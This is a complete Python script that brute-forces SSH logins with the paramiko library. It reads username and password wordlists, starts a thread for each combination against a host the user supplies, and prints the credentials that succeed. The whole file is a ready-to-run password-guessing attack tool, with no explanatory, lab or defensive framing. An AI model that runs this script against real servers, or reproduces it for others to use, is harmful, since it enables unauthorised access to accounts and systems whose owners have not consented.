import paramiko
import time
import threading

def ssh_brute(host, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        client.connect(host, username=username, password=password)
        print(f"[Success] Username: {username}, Password: {password}")
    except paramiko.AuthenticationException:
        print(f"[Failed] Username: {username}, Password: {password}")
    except Exception as e:
        print(f"[Error] {str(e)}")
    finally:
        client.close()

def main():
    host = input("LHOST: ")
    username_file = input("USERNAMELIST: ")
    password_file = input("PASSLIST: ")

    with open(username_file, 'r') as usernames:
        for username in usernames:
            username = username.strip()
            with open(password_file, 'r') as passwords:
                for password in passwords:
                    password = password.strip()
                    threading.Thread(target=ssh_brute, args=(host, username, password)).start()
                    time.sleep(1)

if __name__ == '__main__':
    main()
